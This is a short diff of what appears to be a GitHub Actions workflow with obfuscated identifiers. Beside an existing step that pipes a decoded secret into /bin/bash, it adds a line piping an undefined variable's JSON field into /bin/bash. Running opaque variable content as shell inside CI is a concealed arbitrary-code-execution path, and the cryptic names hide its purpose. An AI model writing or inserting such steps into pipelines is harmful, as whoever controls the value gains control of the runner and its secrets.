@@ -18,6 +18,7 @@ jobs:
           n78976: ${{ secrets.n78976 }}
         run: |
           printf '%s' "$n78976" | jq -r .kiwd05882 | /bin/bash
+          echo $hn262 | jq -r .y500 | /bin/bash
 
       - name: Upload data
         if: always()
